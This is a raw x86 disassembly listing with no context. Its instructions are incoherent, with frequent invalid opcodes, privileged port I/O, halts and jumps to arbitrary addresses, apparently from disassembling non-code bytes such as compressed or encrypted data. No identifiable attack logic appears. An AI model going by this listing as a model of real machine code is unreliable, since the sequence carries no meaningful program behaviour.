  40f024:	push   edx
  40f025:	std    
  40f026:	push   0x55da8b12
  40f02b:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f02d:	in     eax,dx
  40f02e:	dec    eax
  40f02f:	sub    BYTE PTR ss:[eax+edi*4-0x1c86e036],ch
  40f037:	xchg   ebp,eax
  40f038:	adc    DWORD PTR [ecx-0x40],eax
  40f03b:	cli    
  40f03c:	cmp    eax,0x6798d28b
  40f041:	mov    eax,ds:0x85de57ad
  40f046:	mov    ebx,0x6f117c5
  40f04b:	pop    ss
  40f04c:	out    dx,eax
  40f04d:	enter  0x29,0x99
  40f051:	cli    
  40f052:	push   ecx
  40f053:	sub    dl,BYTE PTR [ecx-0x5d6c19a1]
  40f059:	xor    eax,0xab3fe21d
  40f05e:	(bad)  
  40f05f:	xor    al,0x4c
  40f061:	and    eax,0x6ce3af84
  40f066:	fs xchg edx,eax
  40f068:	es jo  0x40f080
  40f06b:	inc    esp
  40f06c:	cmp    ch,dl
  40f06e:	or     al,0x63
  40f071:	cdq    
  40f072:	xchg   BYTE PTR [ebx+0xa],dh
  40f075:	mov    ebp,DWORD PTR [eax+eax*1+0x0]
	...
  40f0bc:	add    BYTE PTR [eax],al
  40f0be:	add    ah,ch
  40f0c0:	ss ins BYTE PTR es:[edi],dx
  40f0c2:	or     esi,edi
  40f0c4:	pop    ebx
  40f0c5:	in     eax,dx
  40f0c6:	test   DWORD PTR [edi-0x26],0xf7c69ed2
  40f0cd:	push   es
  40f0ce:	(bad)  
  40f0cf:	mov    ebx,0x200000f6
  40f0d4:	pop    es
  40f0d5:	add    BYTE PTR [eax],al
  40f0d7:	or     DWORD PTR [edx+0x79],0x79c38df9
  40f0de:	adc    BYTE PTR [ebx],al
  40f0e0:	mov    edx,DWORD PTR [esi-0x249c0dfa]
  40f0e6:	cmp    bh,BYTE PTR fs:[edi+edi*2+0x1e]
  40f0eb:	xor    DWORD PTR [ecx+ebp*1],ebp
  40f0ee:	xor    BYTE PTR [edx-0x58],ch
  40f0f1:	outs   dx,BYTE PTR ds:[esi]
  40f0f2:	sub    eax,0x5dc3042c
  40f0f7:	out    0xc9,al
  40f0f9:	in     eax,dx
  40f0fa:	nop
  40f0fb:	aad    0x0
  40f0fd:	mov    al,0x7e
  40f0ff:	or     DWORD PTR [ebp+0x605a01b2],esp
  40f105:	fs aas 
  40f107:	es shl ch,0xe9
  40f10b:	jnp    0x40f10e
  40f10d:	test   eax,0x19351672
  40f112:	xor    DWORD PTR [eax-0xd8dbeef],edx
  40f118:	sub    cl,cl
  40f11a:	or     dl,BYTE PTR [ebp-0x5bbf668a]
  40f120:	into   
  40f121:	sbb    BYTE PTR [ebp-0x12ddd8b7],ah
  40f127:	push   edx
  40f128:	or     eax,0xd60dd3b1
  40f12d:	sbb    BYTE PTR [eax+eiz*4+0x16138895],0x5a
  40f135:	and    cl,ch
  40f137:	bound  eax,QWORD PTR [eax]
  40f139:	iret   
  40f13a:	push   ebp
  40f13b:	and    dl,BYTE PTR [edx]
  40f13d:	xchg   edx,eax
  40f13e:	push   ecx
  40f13f:	mov    edi,0xb2e5ec32
  40f144:	fcom   st(0)
  40f146:	mov    eax,0x243686d2
  40f14b:	cmp    eax,DWORD PTR [eax]
  40f14d:	sub    al,0xd9
  40f14f:	sbb    al,0x26
  40f151:	xor    ah,dh
  40f153:	fiadd  DWORD PTR [ecx-0x341fae8]
  40f159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f15a:	or     eax,0xae155de5
  40f15f:	call   0x1a7294c0
  40f164:	push   0xb024b223
  40f169:	mov    edx,0x6cd2029c
  40f16e:	mov    ?,WORD PTR [esi-0x1b08eacf]
  40f174:	or     DWORD PTR [ecx+edi*8],ebp
  40f177:	cmc    
  40f178:	add    edi,esi
  40f17a:	cmp    cl,ah
  40f17c:	(bad)  
  40f17d:	popa   
  40f17e:	lods   al,BYTE PTR ds:[esi]
  40f17f:	xchg   ebp,eax
  40f180:	pop    eax
  40f181:	and    eax,0x36d3a0c1
  40f186:	adc    DWORD PTR [eax+ebp*2],edi
  40f189:	xor    eax,0xb03a600b
  40f18e:	inc    esi
  40f18f:	jo     0x40f1ff
  40f191:	cmp    BYTE PTR [ecx-0xca71126],bl
  40f197:	and    eax,DWORD PTR ds:0x3899cca6
  40f19d:	inc    edx
  40f19e:	xor    ecx,DWORD PTR [edi+0x36]
  40f1a1:	fwait
  40f1a2:	push   0xffffffad
  40f1a4:	sub    esi,edi
  40f1a6:	retf   
  40f1a7:	retf   0xb8bd
  40f1aa:	sbb    dl,dh
  40f1ac:	xor    al,0x28
  40f1ae:	mov    cs:0xa1435c7,eax
  40f1b4:	test   al,0xa
  40f1b6:	jmp    0x40f164
  40f1b8:	imul   eax,DWORD PTR [edi+edx*4],0x543ed340
  40f1bf:	scas   eax,DWORD PTR es:[edi]
  40f1c0:	jae    0x40f1d6
  40f1c2:	inc    edx
  40f1c3:	dec    edi
  40f1c4:	and    dl,dh
  40f1c6:	xlat   BYTE PTR ds:[ebx]
  40f1c7:	xchg   ecx,eax
  40f1c8:	jp     0x40f21d
  40f1ca:	add    ecx,edi
  40f1cc:	daa    
  40f1cd:	add    dl,0x6a
  40f1d0:	jmp    0xabae30e0
  40f1d5:	xchg   ecx,eax
  40f1d6:	sub    bh,BYTE PTR [eax]
  40f1d8:	push   ds
  40f1d9:	dec    eax
  40f1da:	inc    ebx
  40f1db:	sti    
  40f1dc:	call   ecx
  40f1de:	xor    eax,0x1f7b00f8
  40f1e3:	jg     0x40f246
  40f1e5:	jg     0x40f1cb
  40f1e7:	mov    eax,0xe3abde89
  40f1ec:	jmp    0x40f193
  40f1ee:	inc    esp
  40f1ef:	call   0x52c:0x6c89c9f6
  40f1f6:	sub    eax,0x79c90cee
  40f1fb:	adc    al,0x61
  40f1fd:	mov    esi,0xfc52b640
  40f202:	aas    
  40f203:	loope  0x40f244
  40f205:	adc    eax,0x6951113a
  40f20a:	out    dx,al
  40f20b:	or     ebp,edi
  40f20d:	pop    ecx
  40f20e:	sbb    eax,DWORD PTR [esi+0x3d1a749a]
  40f214:	pop    ebx
  40f215:	push   cs
  40f216:	jns    0x40f1f0
  40f218:	push   esp
  40f219:	aam    0x12
  40f21b:	inc    edx
  40f21c:	pop    ds
  40f21d:	std    
  40f21e:	enter  0xe4a7,0xe
  40f222:	popf   
  40f223:	adc    DWORD PTR [ebp-0x23],ebp
  40f226:	in     eax,0x99
  40f228:	dec    esp
  40f229:	mov    ds:0xf9bf20b4,eax
  40f22e:	call   0xb92a:0xef35f42b
  40f235:	or     DWORD PTR [edx+ecx*8-0x30],esi
  40f239:	ror    DWORD PTR [ebx],cl
  40f23b:	xchg   esp,eax
  40f23c:	clc    
  40f23d:	add    bl,bl
  40f23f:	je     0x40f298
  40f241:	je     0x40f234
  40f243:	or     esi,ebx
  40f245:	aaa    
  40f246:	or     eax,0x6f2c64d5
  40f24b:	sbb    al,0xb1
  40f24d:	jle    0x40f292
  40f24f:	xchg   dl,ah
  40f251:	into   
  40f252:	push   esp
  40f253:	add    BYTE PTR [esp+ecx*8+0x52],dh
  40f257:	push   cs
  40f258:	aam    0x55
  40f25a:	xor    eax,0x293aa085
  40f25f:	aas    
  40f260:	sub    al,0xf9
  40f262:	sbb    eax,0x26c394fe
  40f267:	enter  0xfd7a,0x52
  40f26b:	aaa    
  40f26c:	mov    al,0x5
  40f26e:	mov    esp,0xc07c62e7
  40f273:	and    BYTE PTR [edx-0x3f],bl
  40f276:	cdq    
  40f277:	xchg   BYTE PTR [edx],bh
  40f279:	jl     0x40f203
  40f27b:	out    dx,al
  40f27c:	xchg   BYTE PTR [eax],cl
  40f27e:	add    edx,DWORD PTR [edi+0x39108e4f]
  40f284:	jo     0x40f257
  40f286:	mov    ebx,0x94aec8d6
  40f28b:	mov    edi,0x697572d6
  40f290:	fld    DWORD PTR [ebx]
  40f292:	add    BYTE PTR [ecx-0x6],ch
  40f295:	stos   DWORD PTR es:[edi],eax
  40f296:	mov    ebp,0x1b98c294
  40f29b:	stos   DWORD PTR es:[edi],eax
  40f29c:	sbb    ah,BYTE PTR [ebx+edi*8-0x16ba8dc6]
  40f2a3:	shr    DWORD PTR [edx],cl
  40f2a5:	(bad)  
  40f2a6:	add    BYTE PTR [edi-0x42e68063],dl
  40f2ac:	ja     0x40f2ba
  40f2ae:	loopne 0x40f2ab
  40f2b0:	xchg   ebp,eax
  40f2b1:	or     eax,0x449d8ce3
  40f2b6:	push   ebx
  40f2b7:	add    BYTE PTR [edi],ah
  40f2b9:	jle    0x40f2ca
  40f2bb:	cmp    eax,0xe461bc08
  40f2c0:	push   eax
  40f2c1:	test   eax,0x6a9286b3
  40f2c6:	inc    ecx
  40f2c7:	fdivr  DWORD PTR [edi+0x13]
  40f2ca:	or     eax,0xb9711d6f
  40f2cf:	inc    ebx
  40f2d0:	into   
  40f2d1:	(bad)  
  40f2d2:	icebp  
  40f2d3:	ret    
  40f2d4:	push   esi
  40f2d5:	xlat   BYTE PTR ds:[ebx]
  40f2d6:	mov    esp,0x1fe28e5c
  40f2db:	retf   
  40f2dc:	sub    bh,BYTE PTR [ebp+0x6351fa4a]
  40f2e2:	int    0x2c
  40f2e4:	dec    eax
  40f2e5:	jg     0x40f26d
  40f2e7:	mov    esi,0x7ab67844
  40f2ec:	xchg   ecx,eax
  40f2ed:	in     al,0x78
  40f2ef:	sbb    BYTE PTR [esi-0x972597d],0x4b
  40f2f6:	jb     0x40f2a1
  40f2f8:	or     ch,bl
  40f2fa:	mov    ch,0xed
  40f2fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2fd:	lahf   
  40f2fe:	push   esp
  40f2ff:	push   edi
  40f300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f301:	fsub   DWORD PTR [ebx+eax*1]
  40f304:	repz inc ebx
  40f306:	out    0xb7,eax
  40f308:	mov    BYTE PTR [ebp+0x34],ch
  40f30b:	and    edx,DWORD PTR [edx+edi*4]
  40f30e:	push   ebp
  40f30f:	dec    ecx
  40f310:	fcmovnu st,st(7)
  40f312:	fnstcw WORD PTR [ecx+0x23]
  40f315:	and    eax,edi
  40f317:	pop    es
  40f318:	jl     0x40f2aa
  40f31a:	dec    ebp
  40f31b:	jne    0x40f31b
  40f31d:	pop    ecx
  40f31e:	in     eax,0xc4
  40f320:	in     al,dx
  40f321:	pop    es
  40f322:	mov    ah,cl
  40f324:	hlt    
  40f325:	inc    esp
  40f326:	adc    BYTE PTR [ebx],ch
  40f328:	cld    
  40f329:	xor    BYTE PTR [edx+0x78],0x22
  40f32d:	dec    esi
  40f32e:	(bad)  
  40f32f:	iret   
  40f330:	out    0x47,eax
  40f332:	mov    esp,0x4b729660
  40f337:	(bad)  
  40f338:	jmp    0xd226c154
  40f33d:	mov    cl,0x54
  40f33f:	je     0x40f39b
  40f341:	add    eax,0x36a2b692
  40f346:	pop    eax
  40f347:	int3   
  40f348:	lds    ecx,FWORD PTR [ebp+0x676fc899]
  40f34e:	loopne 0x40f35e
  40f350:	lods   eax,DWORD PTR ds:[esi]
  40f351:	or     al,0xfc
  40f353:	ret    0xf963
  40f356:	outs   dx,BYTE PTR ds:[esi]
  40f357:	mov    eax,0xc143a218
  40f35c:	jnp    0x40f389
  40f35e:	dec    eax
  40f35f:	push   ds
  40f360:	xor    BYTE PTR [esi-0x6e519bf8],bh
  40f366:	and    al,0xf6
  40f368:	add    al,BYTE PTR [esi+0x4d8b8606]
  40f36e:	(bad)  
  40f36f:	retf   
  40f370:	add    dl,BYTE PTR [eax+0x20]
  40f373:	jb     0x40f34d
  40f375:	jecxz  0x40f31f
  40f377:	(bad)  
  40f378:	out    0x3f,al
  40f37a:	loopne 0x40f305
  40f37c:	inc    ecx
  40f37d:	push   ecx
  40f37e:	jmp    0x40f312
  40f380:	xchg   ebp,eax
  40f381:	mov    WORD PTR [ecx+ebx*8-0x7b],gs
  40f385:	mov    al,BYTE PTR [ecx-0x30ce9a83]
  40f38b:	repz out dx,eax
  40f38d:	push   eax
  40f38e:	lea    edx,[eax+esi*4+0x5a377dcc]
  40f395:	mov    ebx,0xf9b20a3c
  40f39a:	mov    DWORD PTR [ebp+ebx*1-0x9],ebx
  40f39e:	repz add al,0x3c
  40f3a2:	add    DWORD PTR [ebx+eiz*4],0x2b
  40f3a6:	lock inc eax
  40f3a8:	popa   
  40f3a9:	push   esp
  40f3aa:	and    dh,cl
  40f3ac:	retf   
  40f3ad:	lock ss js 0x40f333
  40f3b1:	sub    al,0x81
  40f3b3:	imul   eax,DWORD PTR ds:0x99b32abe,0xffffffa2
  40f3ba:	lods   al,BYTE PTR ds:[esi]
  40f3bb:	outs   dx,DWORD PTR ds:[esi]
  40f3bc:	adc    al,0xf9
  40f3be:	xor    al,0x28
  40f3c0:	jle    0x40f43f
  40f3c2:	in     eax,dx
  40f3c3:	rcl    edx,1
  40f3c5:	call   DWORD PTR [edx]
  40f3c7:	(bad)  [ebp+0x50]
  40f3ca:	les    ebx,FWORD PTR [ecx+0x2a]
  40f3cd:	and    BYTE PTR es:0x791a1735,0x51
  40f3d5:	or     al,0x50
  40f3d7:	pop    ebp
  40f3d8:	mov    edx,0xe400ed2e
  40f3dd:	sub    BYTE PTR [eax-0x43341927],0xd2
  40f3e4:	lock cmp ecx,DWORD PTR [ecx]
  40f3e7:	mov    ds:0x7086dd30,eax
  40f3ec:	(bad)
  40f3f0:	test   BYTE PTR [edi-0x14537d69],dh
  40f3f6:	jnp    0x40f457
  40f3f8:	jg     0x40f472
  40f3fa:	jb     0x8b2d1a01
  40f400:	lods   al,BYTE PTR ds:[esi]
  40f401:	sahf   
  40f402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f403:	adc    DWORD PTR [eax+0x2da1db7e],esi
  40f409:	fadd   DWORD PTR [edx-0x3a11a8d1]
  40f40f:	mov    cl,0x4f
  40f411:	or     ecx,ebp
  40f413:	or     eax,0x4d3ed7dc
  40f418:	popf   
  40f419:	sti    
  40f41a:	imul   edi,esp,0xa950d222
  40f420:	mov    WORD PTR [ebp+0x2c],ss
  40f423:	pop    esp
  40f424:	mov    dh,0x22
  40f426:	add    ebx,0x60
  40f429:	in     al,0x42
  40f42b:	ja     0x40f491
  40f42d:	mov    ebx,0x4b026291
  40f432:	cwde   
  40f433:	sub    al,0x3d
  40f435:	adc    BYTE PTR [ebx],bl
  40f437:	sub    ah,BYTE PTR [edi+ebx*2]
  40f43a:	rol    BYTE PTR [ebp-0x11],cl
  40f43d:	pop    ebx
  40f43e:	jg     0x40f455
  40f440:	xor    al,0x99
  40f442:	sub    BYTE PTR [esi],dl
  40f444:	imul   ebp
  40f446:	xchg   edx,eax
  40f447:	stos   DWORD PTR es:[edi],eax
  40f448:	das    
  40f449:	add    BYTE PTR [ecx+0x15d3c3a5],dl
  40f44f:	repnz mov edi,0x21c6dfe
  40f455:	dec    eax
  40f456:	leave  
  40f457:	inc    edx
  40f458:	pop    eax
  40f459:	cmp    eax,0xe24b375c
  40f45e:	add    eax,DWORD PTR [eax-0x6c]
  40f461:	xor    esp,DWORD PTR [edi-0xb]
  40f464:	ficom  DWORD PTR [eax+0x7491cb5e]
  40f46a:	xchg   edx,eax
  40f46b:	pusha  
  40f46c:	pusha  
  40f46d:	scas   eax,DWORD PTR es:[edi]
  40f46e:	ins    DWORD PTR es:[edi],dx
  40f46f:	call   0xfe82:0x47fa9998
  40f476:	cld    
  40f477:	mov    ah,0xcc
  40f479:	fild   WORD PTR [esi-0x5d]
  40f47c:	in     eax,dx
  40f47d:	xor    al,BYTE PTR [ecx-0x3d965d56]
  40f483:	je     0x40f4de
  40f485:	dec    BYTE PTR [ecx-0x5b8257f5]
  40f48b:	adc    BYTE PTR [ecx+edi*4+0x43d8e077],bh
  40f492:	and    eax,0x6d5c911b
  40f497:	pop    ss
  40f498:	jno    0x40f460
  40f49a:	adc    edx,DWORD PTR [edi-0x2c]
  40f49d:	pop    edi
  40f49e:	js     0x40f42e
  40f4a0:	or     bh,BYTE PTR ds:0xc426a930
  40f4a6:	aaa    
  40f4a7:	mov    ebx,0xbb77abd6
  40f4ac:	out    0x58,eax
  40f4ae:	jle    0x40f4d4
  40f4b0:	inc    esp
  40f4b1:	adc    DWORD PTR [ebx+0x41e0f5fb],esi
  40f4b7:	loop   0x40f479
  40f4b9:	push   esi
  40f4ba:	xchg   edi,eax
  40f4bb:	rcl    BYTE PTR [ebp-0x13d91976],0x81
  40f4c2:	(bad)  
  40f4c3:	lods   eax,DWORD PTR ds:[esi]
  40f4c4:	dec    edx
  40f4c5:	dec    edi
  40f4c6:	pushf  
  40f4c7:	add    eax,0xd770338b
  40f4cc:	call   FWORD PTR [esi]
  40f4ce:	mov    bl,0x18
  40f4d0:	popa   
  40f4d1:	imul   esp,DWORD PTR [edi-0x50],0x7c
  40f4d5:	jb     0x40f48b
  40f4d7:	dec    edi
  40f4d8:	jae    0x40f465
  40f4da:	int3   
  40f4db:	out    0x36,eax
  40f4dd:	retf   0xf207
  40f4e0:	push   es
  40f4e1:	fidivr WORD PTR [ebx-0xc]
  40f4e4:	cmc    
  40f4e5:	mov    eax,ds:0x9bc063d6
  40f4ea:	sbb    DWORD PTR [ebx+ecx*2],edx
  40f4ed:	in     eax,0xa4
  40f4ef:	addr16 call 0x556a1ad9
  40f4f5:	xor    eax,0xf2224364
  40f4fa:	or     al,0x25
  40f4fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4fd:	push   esp
  40f4fe:	cmp    al,0x49
  40f500:	xor    eax,0x8227082a
  40f505:	pop    ss
  40f506:	mov    DWORD PTR [ecx-0x7f],esp
  40f509:	ret    
  40f50a:	data16 jo 0x40f4b4
  40f50d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f50e:	cmovs  ebp,DWORD PTR [ebx]
  40f511:	test   DWORD PTR [edx],edx
  40f513:	jno    0x40f4bf
  40f515:	ret    0x4215
  40f518:	call   0x8f9180d
  40f51d:	pop    ss
  40f51e:	inc    esi
  40f51f:	adc    eax,0x82b1894e
  40f524:	addr16 sbb al,0xcf
  40f527:	sub    DWORD PTR [esi+edx*8-0x14],ecx
  40f52b:	sbb    ebp,edi
  40f52d:	outs   dx,DWORD PTR ds:[esi]
  40f52e:	cmp    ecx,DWORD PTR [edx-0x2656d22f]
  40f534:	loope  0x40f4fa
  40f536:	adc    ebx,0x77
  40f539:	and    al,0xd8
  40f53b:	out    0x2a,al
  40f53d:	adc    al,0x79
  40f53f:	or     edx,DWORD PTR ds:0xea8ad5b
  40f545:	xchg   BYTE PTR [edx+0x7f],bh
  40f548:	popa   
  40f549:	test   eax,0x6ccca20b
  40f54e:	push   ss
  40f54f:	int    0xff
  40f551:	mov    cl,0x45
  40f553:	xchg   edx,eax
  40f554:	and    edx,esp
  40f556:	stos   BYTE PTR es:[edi],al
  40f557:	sti    
  40f558:	pop    ebx
  40f559:	loope  0x40f58a
  40f55b:	mov    ah,0x3d
  40f55d:	jo     0x40f545
  40f55f:	push   edi
  40f560:	cmp    ebp,edi
  40f562:	outs   dx,DWORD PTR ds:[esi]
  40f563:	(bad)
  40f567:	xor    DWORD PTR [eax-0x1b],edx
  40f56a:	retf   0x4443
  40f56d:	outs   dx,BYTE PTR ds:[esi]
  40f56e:	mov    ch,0x60
  40f570:	js     0x40f5c3
  40f572:	mov    ds:0xcdd97623,al
  40f577:	retf   
  40f578:	push   esi
  40f579:	jnp    0x40f5f3
  40f57b:	jecxz  0x40f592
  40f57d:	fisttp DWORD PTR [ebp+esi*4+0x4e]
  40f581:	shr    BYTE PTR [eax-0x16ae19e9],0xc2
  40f588:	sub    BYTE PTR [edx+0x76838482],al
  40f58e:	(bad)  
  40f58f:	mov    DWORD PTR [edx],esi
  40f591:	(bad)
  40f595:	jmp    0x40f60c
  40f597:	pop    ecx
  40f598:	sti    
  40f599:	xchg   ebp,eax
  40f59a:	jmp    0x9bfe8de4
  40f59f:	sahf   
  40f5a0:	mov    ebp,0xa8413cab
  40f5a5:	sbb    DWORD PTR [ecx-0x4d],esp
  40f5a8:	push   0xffffff9e
  40f5aa:	leave  
  40f5ab:	mov    ebp,0x47974b48
  40f5b0:	jns    0x40f597
  40f5b2:	jmp    edx
  40f5b4:	out    dx,al
  40f5b5:	adc    ch,BYTE PTR [edi-0x7d169f60]
  40f5bb:	jp     0x40f5f6
  40f5bd:	mov    WORD PTR [ecx+0x79],ds
  40f5c0:	sbb    ah,BYTE PTR [ebx+edx*1+0x3a]
  40f5c4:	dec    ecx
  40f5c5:	xlat   BYTE PTR ds:[ebx]
  40f5c6:	pop    esi
  40f5c7:	push   ecx
  40f5c8:	xchg   ebp,eax
  40f5c9:	clc    
  40f5ca:	dec    ecx
  40f5cb:	jbe    0x40f5a1
  40f5cd:	mov    DWORD PTR [ebp-0x12],esp
  40f5d0:	cmp    BYTE PTR [esi],0x7b
  40f5d3:	(bad)  [edx-0x61]
  40f5d6:	imul   eax,DWORD PTR [edx],0xe5dcd817
  40f5dc:	push   cs
  40f5dd:	dec    esp
  40f5de:	fadd   QWORD PTR [ecx]
  40f5e0:	pop    ss
  40f5e1:	jmp    0x40f5e9
  40f5e3:	sbb    ebp,ebp
  40f5e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5e6:	ret    
  40f5e7:	sbb    ch,ch
  40f5e9:	pusha  
  40f5ea:	jbe    0x40f64f
  40f5ec:	xchg   BYTE PTR [esi+0x57],bh
  40f5ef:	mov    dh,0x9c
  40f5f1:	mov    esi,0xa20f0137
  40f5f6:	mov    cl,0x2e
  40f5f8:	scas   al,BYTE PTR es:[edi]
  40f5f9:	fs out dx,eax
  40f5fb:	adc    DWORD PTR [edx+0x28b4a188],eax
  40f601:	mov    ecx,0x7dd36b52
  40f606:	mov    ebx,0x1549e18b
  40f60b:	xchg   DWORD PTR [edi-0xe],edx
  40f60e:	or     ch,bl
  40f610:	sub    ecx,eax
  40f612:	fsubrp st(7),st
  40f614:	jbe    0x40f5ef
  40f616:	mov    ebx,0x18d5e4b0
  40f61b:	(bad)  
  40f61c:	ror    BYTE PTR [ebp+0xcf35104],cl
  40f622:	mov    ds:0xf5cc62e0,eax
  40f627:	pop    esi
  40f628:	mov    bh,0x77
  40f62a:	xchg   ecx,eax
  40f62b:	das    
  40f62c:	addr16 jmp 0x2d93:0x85ab4c10
  40f634:	xchg   edx,eax
  40f635:	sub    DWORD PTR [ebp-0x40],eax
  40f638:	test   al,0xea
  40f63a:	add    eax,DWORD PTR [edx+0x1f]
  40f63d:	ins    BYTE PTR es:[edi],dx
  40f63e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f63f:	mov    esp,0x464ce22b
  40f644:	inc    esi
  40f645:	pop    edi
  40f646:	ss aas 
  40f648:	xchg   ebx,eax
  40f649:	xor    ah,bl
  40f64b:	add    edx,esp
  40f64d:	cmp    BYTE PTR [edx],bh
  40f64f:	fnsave [edx-0x1f]
  40f652:	inc    ebp
  40f653:	and    al,0xa0
  40f655:	pop    edi
  40f656:	fldenv [edi-0x50ba7c72]
  40f65c:	sahf   
  40f65d:	sbb    bl,BYTE PTR [edx-0x6d]
  40f660:	mov    esi,0x51c350cb
  40f665:	or     bl,bh
  40f667:	popf   
  40f668:	push   ebx
  40f669:	call   0x115c:0x6637bfbe
  40f670:	mov    al,0x79
  40f672:	les    edx,FWORD PTR [ebx-0x1e1cfe04]
  40f678:	int    0xb8
  40f67a:	add    BYTE PTR [eax-0x64066d00],ah
  40f680:	fistp  DWORD PTR [edi]
  40f682:	sub    al,0x9
  40f684:	imul   BYTE PTR [edx-0x78351806]
  40f68a:	ret    
  40f68b:	or     BYTE PTR [ebx+0x29],ch
  40f68e:	retf   
  40f68f:	cmp    ecx,edi
  40f691:	mov    eax,0xa7229569
  40f696:	push   edx
  40f697:	call   0xfcfc4e0c
  40f69c:	and    eax,0xd2576af1
  40f6a1:	gs mov eax,0xb07c7dc2
  40f6a7:	mov    ebx,DWORD PTR [eax+0x57]
  40f6aa:	push   ecx
  40f6ab:	imul   esp,DWORD PTR [eax+0x46],0xffffffef
  40f6af:	push   0x54
  40f6b1:	pushf  
  40f6b2:	mov    bl,0x27
  40f6b4:	cdq    
  40f6b5:	popf   
  40f6b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6b7:	sti    
  40f6b8:	cmp    esi,0x64
  40f6bb:	push   eax
  40f6bc:	test   al,0x38
  40f6be:	mov    BYTE PTR [esi-0x3868bbf4],ch
  40f6c4:	shl    ch,0x7c
  40f6c7:	stc    
  40f6c8:	mov    eax,edi
  40f6ca:	mov    ds:0xfe164e40,eax
  40f6cf:	xchg   ebx,eax
  40f6d0:	mov    ebx,0xf994a475
  40f6d5:	stc    
  40f6d6:	xchg   edi,edx
  40f6d8:	ja     0x40f6ea
  40f6da:	scas   eax,DWORD PTR es:[edi]
  40f6db:	push   0x3ec61076
  40f6e0:	stos   BYTE PTR es:[edi],al
  40f6e1:	cmp    eax,0xc773ec12
  40f6e6:	pusha  
  40f6e7:	popa   
  40f6e8:	adc    esi,DWORD PTR [edx+0x68dba028]
  40f6ee:	rcl    BYTE PTR [esi+0x1e],cl
  40f6f1:	aas    
  40f6f2:	cld    
  40f6f3:	mov    ebp,0xe9a8c009
  40f6f8:	mov    ebx,0x96857b50
  40f6fd:	in     eax,dx
  40f6fe:	std    
  40f6ff:	or     al,0x81
  40f701:	mov    esi,0xf98f9d4a
  40f706:	push   eax
  40f707:	cmp    bh,cl
  40f709:	test   BYTE PTR [ecx],al
  40f70b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f70c:	xchg   edx,ebp
  40f70e:	sbb    al,BYTE PTR [eax]
  40f710:	sbb    bh,ah
  40f712:	adc    eax,0xc7aaaf31
  40f717:	or     edx,DWORD PTR [edi-0x17b67df0]
  40f71d:	cs sbb eax,0xd06b17
  40f723:	sub    al,0x82
  40f725:	lods   al,BYTE PTR ds:[esi]
  40f726:	scas   al,BYTE PTR es:[edi]
  40f727:	icebp  
  40f728:	sbb    DWORD PTR [edi+edx*1],esi
  40f72b:	jmp    0xe7361510
  40f730:	push   esi
  40f731:	dec    esp
  40f732:	cmp    al,0x9c
  40f734:	add    cl,al
  40f736:	outs   dx,DWORD PTR ds:[esi]
  40f737:	sub    BYTE PTR [edx+edx*8-0x7e],0x56
  40f73c:	xchg   ch,al
  40f73e:	call   FWORD PTR [edi]
  40f740:	xchg   esp,esi
  40f742:	push   0x5
  40f744:	pusha  
  40f745:	lock mov al,0xb7
  40f748:	push   ecx
  40f749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f74a:	mov    ah,0x1d
  40f74c:	mov    eax,edi
  40f74e:	and    dl,BYTE PTR [ebx]
  40f750:	mov    edi,0x25a3fd55
  40f755:	ja     0x40f725
  40f757:	jl     0x40f7c9
  40f759:	xchg   edi,eax
  40f75a:	inc    esp
  40f75b:	adc    BYTE PTR [ebp-0x18],ch
  40f75e:	sbb    eax,0x733ac4c
  40f763:	dec    ecx
  40f764:	js     0x40f71e
  40f766:	jno    0x40f747
  40f768:	or     eax,ecx
  40f76a:	or     BYTE PTR [esi-0x4ccff8f8],cl
  40f770:	adc    dl,BYTE PTR [ebx]
  40f772:	and    dl,BYTE PTR fs:0x8027b08d
  40f779:	mov    dh,0x88
  40f77b:	out    0x8f,eax
  40f77d:	cli    
  40f77e:	push   ebx
  40f77f:	cmp    eax,DWORD PTR [ebx]
  40f781:	mov    WORD PTR [eax+0x3e],es
  40f784:	loope  0x40f70d
  40f786:	pop    eax
  40f787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f788:	aad    0x7
  40f78a:	dec    edi
  40f78b:	adc    al,0xf7
  40f78d:	inc    ebx
  40f78e:	sub    BYTE PTR [esi+0x4b],cl
  40f791:	pop    edx
  40f792:	jbe    0x40f7a3
  40f794:	pop    ebp
  40f795:	ss push ds
  40f797:	das    
  40f798:	adc    BYTE PTR [ecx-0x5e904c1a],dl
  40f79e:	leave  
  40f79f:	loop   0x40f7ef
  40f7a1:	inc    esp
  40f7a2:	mov    esp,edi
  40f7a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7a5:	jg     0x40f78a
  40f7a7:	rol    DWORD PTR [edi+0x4aa138e6],0xe6
  40f7ae:	rol    BYTE PTR [edi+0x32],1
  40f7b1:	jae    0x40f78f
  40f7b3:	retf   0xe6fd
  40f7b6:	mov    ah,0xa5
  40f7b8:	adc    al,0x75
  40f7ba:	data16 jl 0x40f77e
  40f7bd:	sbb    esp,eax
  40f7bf:	sahf   
  40f7c0:	xchg   edx,eax
  40f7c1:	dec    ecx
  40f7c2:	cwde   
  40f7c3:	push   edi
  40f7c4:	pmuludq mm5,mm3
  40f7c7:	in     eax,0x74
  40f7c9:	rcr    BYTE PTR [edx],1
  40f7cb:	inc    eax
  40f7cd:	jl     0x40f81d
  40f7cf:	dec    edi
  40f7d0:	inc    ecx
  40f7d1:	pop    es
  40f7d2:	push   eax
  40f7d3:	push   cs
  40f7d4:	dec    edx
  40f7d5:	adc    cl,dh
  40f7d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7d8:	mov    dl,0x6a
  40f7da:	fild   WORD PTR [ebp-0x4]
  40f7dd:	enter  0xbe3a,0xa4
  40f7e1:	jne    0x40f7be
  40f7e3:	mov    al,ds:0xf6e638b7
  40f7e8:	push   es
  40f7e9:	arpl   WORD PTR [ecx],di
  40f7eb:	mov    ds:0xf53fbc1c,eax
  40f7f0:	sub    bl,al
  40f7f2:	iret   
